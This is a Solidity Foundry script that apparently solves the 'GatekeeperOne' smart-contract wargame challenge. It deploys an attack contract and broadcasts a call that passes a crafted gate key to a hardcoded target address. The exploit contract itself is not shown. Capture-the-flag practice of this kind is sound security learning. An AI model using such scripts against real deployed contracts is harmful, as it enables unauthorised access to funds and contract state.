// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {GatekeeperOne} from "../src/GatekeeperOne.sol";
import {GatekeeperOneAttack} from "../src/GatekeeperOneAttack.sol";

contract GatekeeperOneScript is Script {
    function run(address _gatekeeper, address _attack) public {
        GatekeeperOne gatekeeper = GatekeeperOne(_gatekeeper);
        GatekeeperOneAttack attack = GatekeeperOneAttack(_attack);
        bytes8 gateKey = 0x1122334400006574;

        vm.startBroadcast();
        uint256 i = attack.enter(gatekeeper, gateKey);
        vm.stopBroadcast();

        console.log("i %d", i);
    }

    function developAttack() public returns(address) {
        vm.startBroadcast();
        GatekeeperOneAttack attack = new GatekeeperOneAttack();
        vm.stopBroadcast();

        console.log("attack develop on %s", address(attack));

        return address(attack);
    }

    function developAndRun() public {
        address attack = developAttack();
        address gatekeeper = 0x7151E542543C50f7Cbc0Fe9CB13baFC4E55321c7;
        run(gatekeeper, attack);
    }
}